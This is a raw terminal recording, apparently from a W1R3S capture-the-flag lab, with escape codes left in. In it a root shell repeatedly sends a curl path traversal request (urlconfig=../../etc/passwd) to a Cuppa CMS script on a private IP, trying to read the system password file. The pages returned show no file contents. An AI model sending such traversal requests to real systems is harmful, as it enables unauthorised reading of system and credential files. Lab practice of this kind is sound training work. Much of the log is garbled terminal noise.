+</div>]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# curl -s --data-urlencode urlconfig=../../../../../../../../../../et/passwcd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cd http://192.168.1.109/administrator/ale[1Prts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cd http://192.168.1.109/administrator/aler[1Pts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C http://192.168.1.109/administrator/alert[1Ps/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cc http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/ http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cp http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ca http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cs http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cs http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cw http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+
+<style>
+    .new_content{
+        position: fixed;
+    }
+    .alert_config_field{
+    	font-size:12px;
+    	background:#FFF;
+    	position:relative;
+    	border-radius: 3px;
+    	box-shadow: 0px 0px 5px rgba(0,0,0,0.2);
+    	overflow:hidden;
+    	position:fixed;
+    	top:50%;
+    	left:50%;
+        width:600px;
+    	height:440px;
+    	margin-left:-300px;
+    	margin-top:-220px;
+    }
+    .alert_config_top{
+        position: relative;
+        margin: 2px;
+        margin-bottom: 0px;
+        border: 1px solid #D2D2D2;
+        background: #4489F8;
+        overflow: auto;
+        color:#FFF;
+        font-size: 13px;
+        padding: 7px 5px;
+        box-shadow: 0 0 2px rgba(0, 0, 0, 0.1);
+        text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
+    }
+    .description_alert{
+    	position:relative;
+    	font-size:12px;
+        text-shadow:0 1px #FFFFFF;
+        font-weight: normal;
+        padding: 5px 0px 5px 0px;
+    }
+    .btnClose_alert{
+    	position:absolute;
+        top: 4px; right: 2px;
+    	width:22px;
+    	height:22px;
+    	cursor:pointer;
+        background:url(js/cuppa/cuppa_images/close_white.png) no-repeat;
+        background-position: center;
+        background-size: 13px;
+    }
+    .content_alert_config{
+    	position:relative;
+    	clear:both;
+        margin: 2px;
+        margin-top: 0px;
+        height: 401px;
+        padding: 10px;
+        overflow: auto;
+    }
+</style>
+<script>
+	function CloseDefaultAlert(){
+		cuppa.setContent({'load':false, duration:0.2});
+        cuppa.blockade({'load':false, duration:0.2, delay:0.1});
+	}
+</script>
+<div class="alert_config_field" id="alert">
+    <div class="alert_config_top">
+        <strong>Configuration</strong>:         <div class="btnClose_alert" id="btnClose_alert" onclick="CloseDefaultAlert()"></div>
+    </div>
+    <div id="content_alert_config" class="content_alert_config">
+            </div>
+</div>]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# curl -s --data-urlencode urlconfig=../../../../../../../../../../et/passwc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/et/passwc/passwd http://192.168.1.109/administrato[1Pr/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/et/passwc/passwd http://192.168.1.109/administrator[1P/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cet/passwc/passwd http://192.168.1.109/administrator/[1Palerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ct/passwc/passwd http://192.168.1.109/administrator/a[1Plerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/passwc/passwd http://192.168.1.109/administrator/al[1Perts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cpasswc/passwd http://192.168.1.109/administrator/ale[1Prts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cepasswc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ctpasswc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccpasswc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/passwc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Casswc/passwd http://192.168.1.109/administrator/[1Palerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csswc/passwd http://192.168.1.109/administrator/a[1Plerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cwc/passwd http://192.168.1.109/administrator/al[1Perts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cwc/passwd http://192.168.1.109/administrator/ale[1Prts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cc/passwd http://192.168.1.109/administrator/aler[1Pts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/passwd http://192.168.1.109/administrator/alert[1Ps/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cpasswd http://192.168.1.109/administrator/alerts[1P/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C.etc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C.etc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/etc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C.etc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C.etc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/etc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+
+<style>
+    .new_content{
+        position: fixed;
+    }
+    .alert_config_field{
+    	font-size:12px;
+    	background:#FFF;
+    	position:relative;
+    	border-radius: 3px;
+    	box-shadow: 0px 0px 5px rgba(0,0,0,0.2);
+    	overflow:hidden;
+    	position:fixed;
+    	top:50%;
+    	left:50%;
+        width:600px;
+    	height:440px;
+    	margin-left:-300px;
+    	margin-top:-220px;
+    }
+    .alert_config_top{
+        position: relative;
+        margin: 2px;
+        margin-bottom: 0px;
+        border: 1px solid #D2D2D2;
+        background: #4489F8;
+        overflow: auto;
+        color:#FFF;
+        font-size: 13px;
+        padding: 7px 5px;
+        box-shadow: 0 0 2px rgba(0, 0, 0, 0.1);
+        text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
+    }
+    .description_alert{
+    	position:relative;
+    	font-size:12px;
+        text-shadow:0 1px #FFFFFF;
+        font-weight: normal;
+        padding: 5px 0px 5px 0px;
+    }
+    .btnClose_alert{
+    	position:absolute;
+        top: 4px; right: 2px;
+    	width:22px;
+    	height:22px;
+    	cursor:pointer;
+        background:url(js/cuppa/cuppa_images/close_white.png) no-repeat;
+        background-position: center;
+        background-size: 13px;
+    }
+    .content_alert_config{
+    	position:relative;
+    	clear:both;
+        margin: 2px;
+        margin-top: 0px;
+        height: 401px;
+        padding: 10px;
+        overflow: auto;
+    }
+</style>
+<script>
+	function CloseDefaultAlert(){
+		cuppa.setContent({'load':false, duration:0.2});
+        cuppa.blockade({'load':false, duration:0.2, delay:0.1});
+	}
+</script>
+<div class="alert_config_field" id="alert">
+    <div class="alert_config_top">
+        <strong>Configuration</strong>:         <div class="btnClose_alert" id="btnClose_alert" onclick="CloseDefaultAlert()"></div>
+    </div>
+    <div id="content_alert_config" class="content_alert_config">
+            </div>
+</div>]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# 
+]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# 
+]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# 
+]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# 
+]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# 
+]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# curl -s --data-urlencode urlconfig=../../../../../../../../../etc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?
+<style>
+    .new_content{
+        position: fixed;
+    }
+    .alert_config_field{
+    	font-size:12px;
+    	background:#FFF;
+    	position:relative;
+    	border-radius: 3px;
+    	box-shadow: 0px 0px 5px rgba(0,0,0,0.2);
+    	overflow:hidden;
+    	position:fixed;
+    	top:50%;
+    	left:50%;
+        width:600px;
+    	height:440px;
+    	margin-left:-300px;
+    	margin-top:-220px;
+    }
+    .alert_config_top{
+        position: relative;
+        margin: 2px;
+        margin-bottom: 0px;
+        border: 1px solid #D2D2D2;
+        background: #4489F8;
+        overflow: auto;
+        color:#FFF;
+        font-size: 13px;
+        padding: 7px 5px;
+        box-shadow: 0 0 2px rgba(0, 0, 0, 0.1);
+        text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
+    }
+    .description_alert{
+    	position:relative;
+    	font-size:12px;
+        text-shadow:0 1px #FFFFFF;
+        font-weight: normal;
+        padding: 5px 0px 5px 0px;
+    }
+    .btnClose_alert{
+    	position:absolute;
+        top: 4px; right: 2px;
+    	width:22px;
+    	height:22px;
+    	cursor:pointer;
+        background:url(js/cuppa/cuppa_images/close_white.png) no-repeat;
+        background-position: center;
+        background-size: 13px;
+    }
+    .content_alert_config{
+    	position:relative;
+    	clear:both;
+        margin: 2px;
+        margin-top: 0px;
+        height: 401px;
+        padding: 10px;
+        overflow: auto;
+    }
+</style>
+<script>
+	function CloseDefaultAlert(){
+		cuppa.setContent({'load':false, duration:0.2});
+        cuppa.blockade({'load':false, duration:0.2, delay:0.1});
+	}
+</script>
+<div class="alert_config_field" id="alert">
+    <div class="alert_config_top">
+        <strong>Configuration</strong>:         <div class="btnClose_alert" id="btnClose_alert" onclick="CloseDefaultAlert()"></div>
+    </div>
+    <div id="content_alert_config" class="content_alert_config">
+            </div>
+</div>]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# exit
+exit
+
+Script done on 2020-09-27 21:05:53-03:00 [COMMAND_EXIT_CODE="0"]
